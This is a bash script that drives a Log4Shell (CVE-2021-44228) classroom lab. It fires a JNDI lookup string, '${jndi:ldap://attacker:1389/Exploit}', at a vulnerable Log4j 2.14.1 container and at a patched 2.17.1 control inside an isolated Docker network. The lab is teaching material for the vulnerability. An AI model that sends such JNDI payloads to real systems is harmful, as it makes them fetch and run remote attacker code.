#!/usr/bin/env bash
#
# SC3010 Log4Shell teaching lab -- one-shot demonstration driver.
#
# Builds the lab, fires the exploit chain against the VULNERABLE victim
# (Log4j 2.14.1), repeats the identical input against the PATCHED control
# (Log4j 2.17.1) to show it is inert, then tears everything down.
#
# Everything runs on an internal Docker network with NO internet egress.
# The payload is read-only (`id`) and only prints a proof line.
#
# Usage:   ./run_lab.sh
#
set -u

# Pick `docker compose` (v2) or `docker-compose` (v1), whichever exists.
if docker compose version >/dev/null 2>&1; then
    DC="docker compose"
elif command -v docker-compose >/dev/null 2>&1; then
    DC="docker-compose"
else
    echo "ERROR: need Docker with the compose plugin (or docker-compose)." >&2
    exit 1
fi

MALICIOUS='${jndi:ldap://attacker:1389/Exploit}'

hr()      { printf '%s\n' "======================================================================"; }
section() { echo; hr; echo "## $*"; hr; }

cleanup() {
    section "STEP 5/5 -- Tearing down the lab"
    $DC down --remove-orphans >/dev/null 2>&1 || true
    echo "[run_lab] all containers and the internal network removed."
}
trap cleanup EXIT

section "SC3010 Log4Shell lab (CVE-2021-44228) -- isolated, offline, defanged"
echo "Malicious input used for BOTH victims:"
echo "    $MALICIOUS"
echo "Payload is read-only: it runs 'id' and prints one [EXPLOIT-PROOF] line."

section "STEP 1/5 -- Building images (build-time network allowed)"
if ! $DC build; then
    echo "ERROR: build failed." >&2
    exit 1
fi

section "STEP 2/5 -- Starting the attacker (LDAP :1389 + HTTP :8000)"
$DC up -d attacker
# Give the Python servers a moment to bind their sockets.
sleep 3
echo "[run_lab] attacker is up. Recent attacker log:"
$DC logs attacker | tail -n 8

section "STEP 3/5 -- VULNERABLE victim (Log4j 2.14.1) logs the malicious string"
echo "Watch for the line:  [EXPLOIT-PROOF] Arbitrary code executed inside victim JVM."
echo
$DC run --rm victim
VICTIM_RC=$?
echo
echo "[run_lab] vulnerable victim exited with code $VICTIM_RC"
echo "[run_lab] attacker log after the vulnerable run:"
$DC logs attacker | tail -n 12

section "STEP 4/5 -- PATCHED victim (Log4j 2.17.1), IDENTICAL input"
echo "Expect: the string is logged LITERALLY and NO [EXPLOIT-PROOF] line appears."
echo
$DC run --rm victim-patched
echo
echo "[run_lab] patched victim finished. Compare the two runs above:"
echo "  - vulnerable 2.14.1 : class loaded, [EXPLOIT-PROOF] printed"
echo "  - patched    2.17.1 : input logged as plain text, chain never fires"

# cleanup() runs on EXIT.
